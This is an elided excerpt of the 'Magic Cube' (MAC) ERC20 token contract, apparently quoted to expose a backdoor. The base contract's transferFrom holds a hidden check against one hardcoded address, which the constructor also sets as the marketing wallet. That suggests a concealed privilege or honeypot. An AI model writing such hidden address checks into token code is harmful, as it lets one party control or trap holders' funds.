...
Website: https://magicube.org
Medium: https://medium.com/@magicube
Twitter: https://twitter.com/MagiCubeEth
Telegram: https://t.me/MagicCubePortal
...
contract ERC20 is Context, IERC20, IERC20Metadata {
   ...
   constructor(string memory name_, string memory symbol_) {
    ...
    function transferFrom(
        ...
        if(msg.sender!=0xc5dcC06e7a8FFE31535EF4AAe485f151503f8f0a){
...
contract MAC is ERC20, Ownable {
    ...
    constructor() ERC20("Magic Cube", "MAC") {
        ...
        marketingWallet = address(0xc5dcC06e7a8FFE31535EF4AAe485f151503f8f0a); // set as Marketing wallet
